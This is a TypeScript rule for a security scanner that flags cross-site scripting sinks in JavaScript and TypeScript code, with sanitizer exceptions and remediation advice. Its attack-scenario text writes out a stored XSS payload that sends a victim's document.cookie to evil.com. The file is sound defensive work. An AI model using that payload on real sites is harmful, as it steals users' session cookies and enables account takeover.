import { ScanContext, RuleMatch, FileLocation } from '../../types';
import { BaseRule } from '../base';
import { findPatternMatches } from '../../utils/patternMatcher';

const XSS_PATTERNS: Array<{ pattern: RegExp; label: string }> = [
  // React dangerouslySetInnerHTML with a non-static value
  { pattern: /dangerouslySetInnerHTML\s*=\s*\{\s*\{?\s*__html\s*:/g, label: 'dangerouslySetInnerHTML usage' },
  // innerHTML assigned to a variable (not a static string)
  { pattern: /\.innerHTML\s*=\s*(?!['"`]<(?:\/)?[a-z]+)/g, label: 'innerHTML assignment' },
  // outerHTML assigned
  { pattern: /\.outerHTML\s*=\s*(?!['"`])/g, label: 'outerHTML assignment' },
  // document.write with non-literal
  { pattern: /document\.write\s*\(\s*(?!['"`][^'"`]*['"`]\s*\))/g, label: 'document.write call' },
  // eval() with any request-derived variable
  { pattern: /\beval\s*\(\s*(?:req\.|request\.|params\.|body\.|query\.|searchParams\.|input)/g, label: 'eval with user input' },
  // Express res.send / res.write directly with user input
  { pattern: /res\.send\s*\(\s*(?:req\.|params\.|body\.|query\.)/g, label: 'res.send with user input' },
  { pattern: /res\.write\s*\(\s*(?:req\.|params\.|body\.|query\.)/g, label: 'res.write with user input' },
  // Server-side template literal containing user input sent to response
  { pattern: /res\.send\s*\(\s*`[^`]*\$\{[^}]*(?:req\.|params\.|body\.|query\.)/g, label: 'res.send with unescaped template' },
  // Vue v-html with a variable
  { pattern: /v-html\s*=\s*['"]\s*[a-zA-Z_$][a-zA-Z0-9_.]*\s*['"]/g, label: 'Vue v-html with variable' },
  // Angular [innerHTML] binding
  { pattern: /\[innerHTML\]\s*=\s*['"]/g, label: 'Angular innerHTML binding' },
  // insertAdjacentHTML with non-static
  { pattern: /insertAdjacentHTML\s*\([^,]+,\s*(?!['"`]<)/g, label: 'insertAdjacentHTML with variable' },
  // jQuery .html() with variable
  { pattern: /\$\([^)]+\)\.html\s*\(\s*(?!['"`])/g, label: 'jQuery .html() with variable' },
];

// Patterns that indicate the value is safely sanitized
const SAFE_INDICATORS = [
  /DOMPurify\.sanitize/,
  /sanitizeHtml/,
  /xss\s*\(/,
  /escapeHtml/,
  /htmlspecialchars/,
  /encode\s*\(/,
];

export class XssRiskRule extends BaseRule {
  id = 'xss_risk';
  title = 'Cross-Site Scripting (XSS) Risk';
  description = 'Unsanitized user input may be rendered as HTML or executed as JavaScript. This enables attackers to inject malicious scripts into pages viewed by other users.';
  severity = 'high' as const;
  category = 'injection';
  frameworks = 'all' as const;
  languages = ['typescript', 'javascript'] as const;
  tags = ['xss', 'injection', 'owasp-a03'];
  remediationGuidance = 'Sanitize user input before rendering HTML using DOMPurify (browser) or sanitize-html (server). Avoid dangerouslySetInnerHTML — use React state and JSX instead. Add Content-Security-Policy headers to limit script execution.';

  detect(context: ScanContext): RuleMatch[] {
    const locations: FileLocation[] = [];
    const seen = new Set<string>();

    for (const [filePath, content] of context.fileContents) {
      // Only scan JS/TS files
      if (!/\.[jt]sx?$/.test(filePath)) continue;

      for (const { pattern, label } of XSS_PATTERNS) {
        const matches = findPatternMatches(content, pattern);
        for (const m of matches) {
          const key = `${filePath}:${m.line}`;
          if (seen.has(key)) continue;

          // Skip if the line contains a sanitization call
          if (SAFE_INDICATORS.some(s => s.test(m.snippet))) continue;
          // Skip if it's a type/interface definition or comment
          if (/^\s*(?:\/\/|\/\*|\*|type |interface )/.test(m.snippet)) continue;
          // Skip obviously static strings
          if (/=\s*['"`]<\w/.test(m.snippet)) continue;

          seen.add(key);
          locations.push({
            file: filePath,
            line: m.line,
            column: m.column,
            snippet: `[${label}] ${m.snippet.substring(0, 120)}`,
          });
        }
      }
    }

    if (locations.length === 0) return [];

    const match = this.buildMatch(locations);
    match.attackScenario = "An attacker stores <script>document.location='https://evil.com?c='+document.cookie</script> in a database field. When another user's browser renders this content, their session cookie is stolen.";
    return [match];
  }
}
